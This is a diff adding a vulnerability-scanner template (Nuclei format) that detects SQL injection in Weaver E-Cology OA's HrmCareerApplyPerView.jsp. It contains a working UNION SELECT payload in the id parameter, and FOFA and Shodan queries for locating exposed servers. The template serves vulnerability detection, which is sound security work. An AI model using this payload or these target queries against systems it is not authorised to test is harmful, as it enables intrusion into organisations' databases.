@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - '{{md5(num)}}'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{num}}'')),4,5,6,7'
+id: weaver-ecology-hrmcareer-sqli
+info:
+    author: SleepingBag945
+    description: |
+        There is a SQL injection vulnerability in the HrmCareerApplyPerView.jsp file of Panwei OA E-Cology. An attacker can obtain sensitive files in the server database through the vulnerability.
+    metadata:
+        fofa-query: app="泛微-协同办公OA"
+        max-request: 1
+        shodan-query: ecology_JSessionid
+        verified: true
+    name: Weaver E-Cology HrmCareerApplyPerView - SQL Injection
+    reference:
+        - https://github.com/ibaiw/2023Hvv/blob/556de69ffc370fd9827e2cf5027373543e2513d4/%E6%B3%9B%E5%BE%AE%20HrmCareerApplyPerView%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L3
+    severity: high
+    tags:
+        - ecology
+        - weaver
+        - 泛微-协同办公OA
+variables:
+    num: "999999999"
